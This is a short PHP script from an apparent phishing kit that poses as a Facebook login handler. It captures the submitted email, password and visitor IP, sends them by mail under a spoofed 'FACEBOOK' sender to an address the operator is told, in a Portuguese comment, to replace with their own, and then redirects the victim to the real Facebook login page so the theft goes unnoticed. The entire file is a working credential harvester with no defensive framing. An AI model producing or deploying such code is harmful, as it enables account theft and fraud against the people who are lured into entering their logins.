<?php

ini_set('display_errors', 0 );
error_reporting(0);

$usuario = $_POST['email'];
$senha = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR'];
$tudo = "Email: ".$usuario." - Senha: ".$senha." - IP: ".$ip."<br>";

$hora = date("Y-m-d  #  H:i:s");
$headers = "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .= "From: FACEBOOK <info@consulta.com.br>";

$c.="<b>======== FACEBOOK ========</b><br>";
$c.="<b>Email: $usuario</b><br>";
$c.="<b>Senha: $senha</b><br>";
$c.="<b>IP: $ip</b><br>";
$c.="<b>======== FACEBOOK ========</b><br>";
mail("email@gmail.com", "$ip [ - $email ]", "$c", $headers); // <- trocar e-mail
header("Location: https://www.facebook.com/login.php?login_attempt=1");
?>